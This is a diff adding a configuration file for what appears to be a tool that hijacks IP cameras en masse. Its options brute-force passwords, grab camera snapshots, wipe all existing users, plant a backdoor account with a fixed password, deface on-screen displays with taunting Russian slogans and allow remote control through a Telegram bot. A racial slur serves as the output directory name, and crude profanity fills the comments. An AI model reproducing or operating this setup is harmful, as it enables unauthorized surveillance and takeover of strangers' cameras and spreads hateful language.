@@ -1,0 +1,31 @@
+snaps = true										# snapshots from cam
+xml = true											# xml autogeneration
+titles = false										# OSD deface
+skip_shitty = true									# skips slow cameras (can work unstably)
+wipe_users = true									# wipes ALL users (except admin, krushitel, bastionne, undervolter, kronaphasia, ratko, etc)
+last_input = '1234567890'							# last prefix/serial/file
+last_out = 'nigger'									# last output dir
+last_threads = 200									# last quantity of workers
+lang = 'ru'											# changes language
+isActivated = false									# legacy: asked for language in 1.4
+debug = false										# debug mode
+# OSD parameters
+channel_text = 't.me/bastionne'						# OSD: changes channel title
+custom_texts = ['ЧЕЧЕНСКИЕ ХАКЕРЫ', 'ВЫЕБАЛИ ВАШУ ПОМОЙКУ', 'привет от', '@mobile_everyday'] # OSD: changes OSD clots 1,2,3,4
+osd_color = '255,255,255'							# OSD: changes text color (may not work on some cameras)
+# owning parameters
+dummy_login = 'bastionne'                           # name of user to be added
+dummy_pass = 'baastion'								# password for user to be added
+brute_passwords = ['']								# list of passwds (bruteforce 2024+ cams)
+tg_bot_token = 'пошел нахуй'						# DANGER: TG Bot API token for headless mode
+tg_chat_ids = ['ascade.li']							# list of authorized users
+discord_rpc = true									# shows the bastionne message on discord
+governor = true										# ya ebu chto eto
+governor_cap = 6000									# popa popa
+geo_db = 'GeoLite2-Country.mmdb'					# path of GeoDB
+geo_db_url = ''										# url of geodb
+geo_allow = []										# geofence: list of allowed countries
+geo_deny = []										# geofence: list of disallowed countries
+geo_deny_unknown = false							# geofence: Drop cams if geo is unknown
+check_update = true									# checks for some updates
+auto_update = false									# auto-updating bastionne, if upd is available
